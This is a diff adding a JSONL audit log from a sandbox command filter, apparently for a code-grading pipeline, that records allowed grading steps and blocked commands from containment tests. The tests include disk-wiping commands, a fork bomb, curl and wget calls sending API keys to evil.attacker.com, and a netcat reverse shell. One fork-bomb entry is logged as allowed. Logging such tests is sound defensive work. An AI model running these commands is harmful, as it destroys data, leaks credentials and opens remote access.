@@ -1,0 +1,162 @@
+{"ts":"2026-10-21T06:40:00.100Z","sandbox_name":"sbx-a1b2c3d4e5f6","command":"echo \"Step 1: Validating submission format...\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:00.800Z","sandbox_name":"sbx-a1b2c3d4e5f6","command":"echo \"Step 2: Sandbox sbx-a1b2c3d4e5f6 ready for grading\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:01.200Z","sandbox_name":"sbx-a1b2c3d4e5f6","command":"echo \"Step 3: Writing submission to /tmp/submission.py\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:01.500Z","sandbox_name":"sbx-a1b2c3d4e5f6","command":"echo \"Step 4: Dependencies pre-baked in image, no pip install needed\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:01.800Z","sandbox_name":"sbx-a1b2c3d4e5f6","command":"echo \"Step 5: Writing test cases to /tmp/test_submission.py\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:02.100Z","sandbox_name":"sbx-a1b2c3d4e5f6","command":"echo \"Step 6: Syntax check - python3 -m py_compile /tmp/submission.py\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:02.300Z","sandbox_name":"sbx-a1b2c3d4e5f6","command":"celesto snapshot create sbx-a1b2c3d4e5f6-pre-step7","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:02.600Z","sandbox_name":"sbx-a1b2c3d4e5f6","command":"python3 -m pytest /tmp/test_submission.py -v --timeout=30 2>&1 || true","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:02.900Z","sandbox_name":"sbx-a1b2c3d4e5f6","command":"echo \"Step 8: Collecting test outputs from /tmp/test_results.txt\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:03.200Z","sandbox_name":"sbx-a1b2c3d4e5f6","command":"echo \"Step 9: Computing final score from test results\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:03.500Z","sandbox_name":"sbx-a1b2c3d4e5f6","command":"echo \"Step 10: Grade report written to /tmp/report.json\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:03.700Z","sandbox_name":"sbx-a1b2c3d4e5f6","command":"celesto sandbox delete sbx-a1b2c3d4e5f6","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:10.100Z","sandbox_name":"sbx-b2c3d4e5f6a1","command":"echo \"Step 1: Validating submission format...\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:10.800Z","sandbox_name":"sbx-b2c3d4e5f6a1","command":"echo \"Step 2: Sandbox sbx-b2c3d4e5f6a1 ready for grading\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:11.200Z","sandbox_name":"sbx-b2c3d4e5f6a1","command":"celesto snapshot create sbx-b2c3d4e5f6a1-pre-step7","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:11.600Z","sandbox_name":"sbx-b2c3d4e5f6a1","command":"python3 -m pytest /tmp/test_submission.py -v --timeout=30 2>&1 || true","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:11.900Z","sandbox_name":"sbx-b2c3d4e5f6a1","command":"celesto sandbox delete sbx-b2c3d4e5f6a1","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:20.100Z","sandbox_name":"sbx-c3d4e5f6a1b2","command":"echo \"Step 1: Validating submission format...\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:20.500Z","sandbox_name":"sbx-c3d4e5f6a1b2","command":"celesto snapshot create sbx-c3d4e5f6a1b2-pre-step7","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:20.900Z","sandbox_name":"sbx-c3d4e5f6a1b2","command":"python3 -m pytest /tmp/test_submission.py -v --timeout=30 2>&1 || true","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:21.200Z","sandbox_name":"sbx-c3d4e5f6a1b2","command":"celesto sandbox delete sbx-c3d4e5f6a1b2","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:30.100Z","sandbox_name":"sbx-d4e5f6a1b2c3","command":"echo \"Step 1: Validating submission format...\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:30.500Z","sandbox_name":"sbx-d4e5f6a1b2c3","command":"celesto snapshot create sbx-d4e5f6a1b2c3-pre-step7","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:30.900Z","sandbox_name":"sbx-d4e5f6a1b2c3","command":"python3 -m pytest /tmp/test_submission.py -v --timeout=30 2>&1 || true","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:31.200Z","sandbox_name":"sbx-d4e5f6a1b2c3","command":"celesto sandbox delete sbx-d4e5f6a1b2c3","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:40.100Z","sandbox_name":"sbx-e5f6a1b2c3d4","command":"echo \"Step 1: Validating submission format...\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:40.500Z","sandbox_name":"sbx-e5f6a1b2c3d4","command":"celesto snapshot create sbx-e5f6a1b2c3d4-pre-step7","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:40.900Z","sandbox_name":"sbx-e5f6a1b2c3d4","command":"python3 -m pytest /tmp/test_submission.py -v --timeout=30 2>&1 || true","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:41.200Z","sandbox_name":"sbx-e5f6a1b2c3d4","command":"celesto sandbox delete sbx-e5f6a1b2c3d4","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:50.100Z","sandbox_name":"sbx-f6a1b2c3d4e5","command":"echo \"Step 1: Validating submission format...\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:50.500Z","sandbox_name":"sbx-f6a1b2c3d4e5","command":"celesto snapshot create sbx-f6a1b2c3d4e5-pre-step7","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:50.900Z","sandbox_name":"sbx-f6a1b2c3d4e5","command":"python3 -m pytest /tmp/test_submission.py -v --timeout=30 2>&1 || true","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:40:51.200Z","sandbox_name":"sbx-f6a1b2c3d4e5","command":"celesto sandbox delete sbx-f6a1b2c3d4e5","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:41:00.100Z","sandbox_name":"sbx-1a2b3c4d5e6f","command":"echo \"Step 1: Validating submission format...\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:41:00.500Z","sandbox_name":"sbx-1a2b3c4d5e6f","command":"celesto snapshot create sbx-1a2b3c4d5e6f-pre-step7","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:41:00.900Z","sandbox_name":"sbx-1a2b3c4d5e6f","command":"python3 -m pytest /tmp/test_submission.py -v --timeout=30 2>&1 || true","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:41:01.200Z","sandbox_name":"sbx-1a2b3c4d5e6f","command":"celesto sandbox delete sbx-1a2b3c4d5e6f","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:41:10.100Z","sandbox_name":"sbx-2b3c4d5e6f1a","command":"echo \"Step 1: Validating submission format...\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:41:10.400Z","sandbox_name":"sbx-2b3c4d5e6f1a","command":"celesto snapshot create sbx-2b3c4d5e6f1a-pre-step7","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:41:10.700Z","sandbox_name":"sbx-2b3c4d5e6f1a","command":"rm -rf /","decision":"block","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:41:10.900Z","sandbox_name":"sbx-2b3c4d5e6f1a","command":"celesto sandbox delete sbx-2b3c4d5e6f1a","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:41:20.100Z","sandbox_name":"sbx-3c4d5e6f1a2b","command":"echo \"Step 1: Validating submission format...\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:41:20.500Z","sandbox_name":"sbx-3c4d5e6f1a2b","command":"celesto snapshot create sbx-3c4d5e6f1a2b-pre-step7","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:41:20.900Z","sandbox_name":"sbx-3c4d5e6f1a2b","command":"python3 -m pytest /tmp/test_submission.py -v --timeout=30 2>&1 || true","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:41:21.200Z","sandbox_name":"sbx-3c4d5e6f1a2b","command":"celesto sandbox delete sbx-3c4d5e6f1a2b","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:41:30.100Z","sandbox_name":"sbx-4d5e6f1a2b3c","command":"echo \"Step 1: Validating submission format...\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:41:30.500Z","sandbox_name":"sbx-4d5e6f1a2b3c","command":"celesto snapshot create sbx-4d5e6f1a2b3c-pre-step7","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:41:30.900Z","sandbox_name":"sbx-4d5e6f1a2b3c","command":"python3 -m pytest /tmp/test_submission.py -v --timeout=30 2>&1 || true","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:41:31.200Z","sandbox_name":"sbx-4d5e6f1a2b3c","command":"celesto sandbox delete sbx-4d5e6f1a2b3c","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:41:40.100Z","sandbox_name":"sbx-5e6f1a2b3c4d","command":"echo \"Step 1: Validating submission format...\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:41:40.500Z","sandbox_name":"sbx-5e6f1a2b3c4d","command":"celesto snapshot create sbx-5e6f1a2b3c4d-pre-step7","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:41:40.900Z","sandbox_name":"sbx-5e6f1a2b3c4d","command":"python3 -m pytest /tmp/test_submission.py -v --timeout=30 2>&1 || true","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:41:41.200Z","sandbox_name":"sbx-5e6f1a2b3c4d","command":"celesto sandbox delete sbx-5e6f1a2b3c4d","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:41:50.100Z","sandbox_name":"sbx-6f1a2b3c4d5e","command":"echo \"Step 1: Validating submission format...\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:41:50.500Z","sandbox_name":"sbx-6f1a2b3c4d5e","command":"celesto snapshot create sbx-6f1a2b3c4d5e-pre-step7","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:41:50.900Z","sandbox_name":"sbx-6f1a2b3c4d5e","command":"python3 -m pytest /tmp/test_submission.py -v --timeout=30 2>&1 || true","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:41:51.200Z","sandbox_name":"sbx-6f1a2b3c4d5e","command":"celesto sandbox delete sbx-6f1a2b3c4d5e","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:42:00.100Z","sandbox_name":"sbx-7a8b9c0d1e2f","command":"echo \"Step 1: Validating submission format...\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:42:00.400Z","sandbox_name":"sbx-7a8b9c0d1e2f","command":"curl -s http://evil.attacker.com/steal?key=$CELESTO_API_KEY","decision":"block","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:42:00.600Z","sandbox_name":"sbx-7a8b9c0d1e2f","command":"celesto snapshot create sbx-7a8b9c0d1e2f-pre-step7","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:42:01.000Z","sandbox_name":"sbx-7a8b9c0d1e2f","command":"python3 -m pytest /tmp/test_submission.py -v --timeout=30 2>&1 || true","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:42:01.300Z","sandbox_name":"sbx-7a8b9c0d1e2f","command":"celesto sandbox delete sbx-7a8b9c0d1e2f","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:42:10.100Z","sandbox_name":"sbx-8b9c0d1e2f3a","command":"echo \"Step 1: Validating submission format...\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:42:10.500Z","sandbox_name":"sbx-8b9c0d1e2f3a","command":"celesto snapshot create sbx-8b9c0d1e2f3a-pre-step7","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:42:10.800Z","sandbox_name":"sbx-8b9c0d1e2f3a","command":"dd if=/dev/zero of=/dev/sda","decision":"block","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:42:11.000Z","sandbox_name":"sbx-8b9c0d1e2f3a","command":"celesto sandbox delete sbx-8b9c0d1e2f3a","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:42:20.100Z","sandbox_name":"sbx-9c0d1e2f3a4b","command":"echo \"Step 1: Validating submission format...\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:42:20.500Z","sandbox_name":"sbx-9c0d1e2f3a4b","command":"celesto snapshot create sbx-9c0d1e2f3a4b-pre-step7","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:42:20.900Z","sandbox_name":"sbx-9c0d1e2f3a4b","command":"python3 -m pytest /tmp/test_submission.py -v --timeout=30 2>&1 || true","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:42:21.200Z","sandbox_name":"sbx-9c0d1e2f3a4b","command":"celesto sandbox delete sbx-9c0d1e2f3a4b","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:42:30.100Z","sandbox_name":"sbx-0d1e2f3a4b5c","command":"echo \"Step 1: Validating submission format...\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:42:30.500Z","sandbox_name":"sbx-0d1e2f3a4b5c","command":"celesto snapshot create sbx-0d1e2f3a4b5c-pre-step7","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:42:30.900Z","sandbox_name":"sbx-0d1e2f3a4b5c","command":"python3 -m pytest /tmp/test_submission.py -v --timeout=30 2>&1 || true","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:42:31.200Z","sandbox_name":"sbx-0d1e2f3a4b5c","command":"celesto sandbox delete sbx-0d1e2f3a4b5c","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:42:40.100Z","sandbox_name":"sbx-1e2f3a4b5c6d","command":"echo \"Step 1: Validating submission format...\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:42:40.500Z","sandbox_name":"sbx-1e2f3a4b5c6d","command":"celesto snapshot create sbx-1e2f3a4b5c6d-pre-step7","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:42:40.900Z","sandbox_name":"sbx-1e2f3a4b5c6d","command":"python3 -m pytest /tmp/test_submission.py -v --timeout=30 2>&1 || true","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:42:41.200Z","sandbox_name":"sbx-1e2f3a4b5c6d","command":"celesto sandbox delete sbx-1e2f3a4b5c6d","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:42:50.100Z","sandbox_name":"sbx-2f3a4b5c6d7e","command":"echo \"Step 1: Validating submission format...\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:42:50.500Z","sandbox_name":"sbx-2f3a4b5c6d7e","command":"celesto snapshot create sbx-2f3a4b5c6d7e-pre-step7","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:42:50.900Z","sandbox_name":"sbx-2f3a4b5c6d7e","command":"python3 -m pytest /tmp/test_submission.py -v --timeout=30 2>&1 || true","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:42:51.200Z","sandbox_name":"sbx-2f3a4b5c6d7e","command":"celesto sandbox delete sbx-2f3a4b5c6d7e","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:00.100Z","sandbox_name":"sbx-3a4b5c6d7e8f","command":"echo \"Step 1: Validating submission format...\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:00.400Z","sandbox_name":"sbx-3a4b5c6d7e8f","command":"wget -q http://evil.attacker.com/steal?key=$LLM_API_KEY","decision":"block","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:00.600Z","sandbox_name":"sbx-3a4b5c6d7e8f","command":"celesto snapshot create sbx-3a4b5c6d7e8f-pre-step7","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:00.900Z","sandbox_name":"sbx-3a4b5c6d7e8f","command":"celesto sandbox delete sbx-3a4b5c6d7e8f","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:10.100Z","sandbox_name":"sbx-4b5c6d7e8f9a","command":"echo \"Step 1: Validating submission format...\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:10.500Z","sandbox_name":"sbx-4b5c6d7e8f9a","command":"celesto snapshot create sbx-4b5c6d7e8f9a-pre-step7","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:10.900Z","sandbox_name":"sbx-4b5c6d7e8f9a","command":"python3 -m pytest /tmp/test_submission.py -v --timeout=30 2>&1 || true","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:11.200Z","sandbox_name":"sbx-4b5c6d7e8f9a","command":"celesto sandbox delete sbx-4b5c6d7e8f9a","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:20.100Z","sandbox_name":"sbx-failsim001a","command":"echo \"Step 1: Validating submission format...\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:20.500Z","sandbox_name":"sbx-failsim001a","command":"celesto snapshot create sbx-failsim001a-pre-step7","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:20.800Z","sandbox_name":"sbx-failsim001a","command":": () { : | : & }; :","decision":"block","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:21.000Z","sandbox_name":"sbx-failsim001a","command":"celesto sandbox delete sbx-failsim001a","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:25.100Z","sandbox_name":"sbx-failsim002b","command":"echo \"Step 8: Collecting test outputs from /tmp/test_results.txt\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:25.500Z","sandbox_name":"sbx-failsim002b","command":"echo \"Step 9: Computing final score from test results\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:25.800Z","sandbox_name":"sbx-failsim002b","command":"echo \"Step 10: Grade report written to /tmp/report.json\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:26.000Z","sandbox_name":"sbx-failsim002b","command":"celesto sandbox delete sbx-failsim002b","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:30.100Z","sandbox_name":"sbx-conc00000001","command":"echo \"Concurrent job 1: validating submission\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:30.500Z","sandbox_name":"sbx-conc00000001","command":"python3 -m pytest /tmp/test_submission.py -v --timeout=30 2>&1 || true","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:30.800Z","sandbox_name":"sbx-conc00000001","command":"celesto sandbox delete sbx-conc00000001","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:30.200Z","sandbox_name":"sbx-conc00000002","command":"echo \"Concurrent job 2: validating submission\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:30.600Z","sandbox_name":"sbx-conc00000002","command":"python3 -m pytest /tmp/test_submission.py -v --timeout=30 2>&1 || true","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:30.900Z","sandbox_name":"sbx-conc00000002","command":"celesto sandbox delete sbx-conc00000002","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:30.400Z","sandbox_name":"sbx-conc00000003","command":"echo \"Concurrent job 3: validating submission\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:30.700Z","sandbox_name":"sbx-conc00000003","command":"python3 -m pytest /tmp/test_submission.py -v --timeout=30 2>&1 || true","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:31.000Z","sandbox_name":"sbx-conc00000003","command":"celesto sandbox delete sbx-conc00000003","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:30.600Z","sandbox_name":"sbx-conc00000004","command":"echo \"Concurrent job 4: validating submission\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:30.900Z","sandbox_name":"sbx-conc00000004","command":"python3 -m pytest /tmp/test_submission.py -v --timeout=30 2>&1 || true","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:31.200Z","sandbox_name":"sbx-conc00000004","command":"celesto sandbox delete sbx-conc00000004","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:30.800Z","sandbox_name":"sbx-conc00000005","command":"echo \"Concurrent job 5: validating submission\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:31.100Z","sandbox_name":"sbx-conc00000005","command":"python3 -m pytest /tmp/test_submission.py -v --timeout=30 2>&1 || true","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:43:31.400Z","sandbox_name":"sbx-conc00000005","command":"celesto sandbox delete sbx-conc00000005","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:45:01.100Z","sandbox_name":"sbx-containtest1","command":"rm -rf /","decision":"block","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:45:01.200Z","sandbox_name":"sbx-containtest1","command":"dd if=/dev/zero of=/dev/sda","decision":"block","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:45:01.300Z","sandbox_name":"sbx-containtest1","command":": () { : | : & }; :","decision":"block","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:45:01.400Z","sandbox_name":"sbx-containtest1","command":"curl -s http://evil.attacker.com/steal?key=$CELESTO_API_KEY","decision":"block","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:45:02.100Z","sandbox_name":"sbx-containtest2","command":"echo \"Writing poisoned submission...\"","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:45:02.300Z","sandbox_name":"sbx-containtest2","command":"curl -s http://evil.attacker.com/steal?key=$CELESTO_API_KEY","decision":"block","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:45:02.500Z","sandbox_name":"sbx-containtest2","command":"celesto sandbox delete sbx-containtest2","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:45:03.100Z","sandbox_name":"sbx-containtest3","command":"rm -rf /tmp/*","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:45:03.300Z","sandbox_name":"sbx-containtest3","command":"echo 'host is safe'","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts":"2026-10-21T06:45:03.500Z","sandbox_name":"sbx-containtest3","command":"celesto sandbox delete sbx-containtest3","decision":"allow","execution_target":"celesto_sandbox"}
+{"ts": "2026-10-23T05:42:18.685943Z", "sandbox_name": "sbx-containtest1", "command": "rm -rf /", "decision": "block", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T05:42:18.689736Z", "sandbox_name": "sbx-containtest1", "command": "dd if=/dev/zero of=/dev/sda", "decision": "block", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T05:42:18.691735Z", "sandbox_name": "sbx-containtest1", "command": ": () { : | : & }; :", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T05:43:17.446986Z", "sandbox_name": "sbx-containtest1", "command": "rm -rf /", "decision": "block", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T05:43:17.450011Z", "sandbox_name": "sbx-containtest1", "command": "dd if=/dev/zero of=/dev/sda", "decision": "block", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T05:43:17.451900Z", "sandbox_name": "sbx-containtest1", "command": ": () { : | : & }; :", "decision": "block", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T05:43:17.454176Z", "sandbox_name": "sbx-containtest1", "command": "curl -s http://evil.attacker.com/steal?key=$CELESTO_API_KEY", "decision": "block", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T05:43:17.456381Z", "sandbox_name": "sbx-containtest1", "command": "wget -q http://evil.attacker.com/steal?key=$API_KEY", "decision": "block", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T05:43:17.458189Z", "sandbox_name": "sbx-containtest1", "command": "nc -e /bin/bash 192.168.1.100 4444", "decision": "block", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T05:43:17.965722Z", "sandbox_name": "sbx-containtest2", "command": "echo \"Writing poisoned submission...\"", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T05:43:18.060886Z", "sandbox_name": "sbx-containtest2", "command": "curl -s http://evil.attacker.com/steal?key=$CELESTO_API_KEY", "decision": "block", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T05:43:18.063190Z", "sandbox_name": "sbx-containtest2", "command": "celesto sandbox delete sbx-containtest2", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T05:43:18.575332Z", "sandbox_name": "sbx-containtest3", "command": "rm -rf /tmp/*", "decision": "block", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T05:43:18.576452Z", "sandbox_name": "sbx-containtest3", "command": "echo 'host is safe'", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T05:43:18.637946Z", "sandbox_name": "sbx-containtest3", "command": "celesto sandbox delete sbx-containtest3", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T06:10:44.992370Z", "sandbox_name": "sbx-containtest1", "command": "rm -rf /", "decision": "block", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T06:10:44.994370Z", "sandbox_name": "sbx-containtest1", "command": "dd if=/dev/zero of=/dev/sda", "decision": "block", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T06:10:44.995906Z", "sandbox_name": "sbx-containtest1", "command": ": () { : | : & }; :", "decision": "block", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T06:10:44.997947Z", "sandbox_name": "sbx-containtest1", "command": "curl -s http://evil.attacker.com/steal?key=$CELESTO_API_KEY", "decision": "block", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T06:10:45.000524Z", "sandbox_name": "sbx-containtest1", "command": "wget -q http://evil.attacker.com/steal?key=$API_KEY", "decision": "block", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T06:10:45.003104Z", "sandbox_name": "sbx-containtest1", "command": "nc -e /bin/bash 192.168.1.100 4444", "decision": "block", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T06:10:45.509460Z", "sandbox_name": "sbx-containtest2", "command": "echo \"Writing poisoned submission...\"", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T06:10:45.616433Z", "sandbox_name": "sbx-containtest2", "command": "curl -s http://evil.attacker.com/steal?key=$CELESTO_API_KEY", "decision": "block", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T06:10:45.619959Z", "sandbox_name": "sbx-containtest2", "command": "celesto sandbox delete sbx-containtest2", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T06:10:46.131085Z", "sandbox_name": "sbx-containtest3", "command": "rm -rf /tmp/*", "decision": "block", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T06:10:46.132598Z", "sandbox_name": "sbx-containtest3", "command": "echo 'host is safe'", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T06:10:46.240049Z", "sandbox_name": "sbx-containtest3", "command": "celesto sandbox delete sbx-containtest3", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T06:16:03.607937Z", "sandbox_name": "sbx-containtest1", "command": "rm -rf /", "decision": "block", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T06:16:03.610692Z", "sandbox_name": "sbx-containtest1", "command": "dd if=/dev/zero of=/dev/sda", "decision": "block", "execution_target": "celesto_sandbox"}
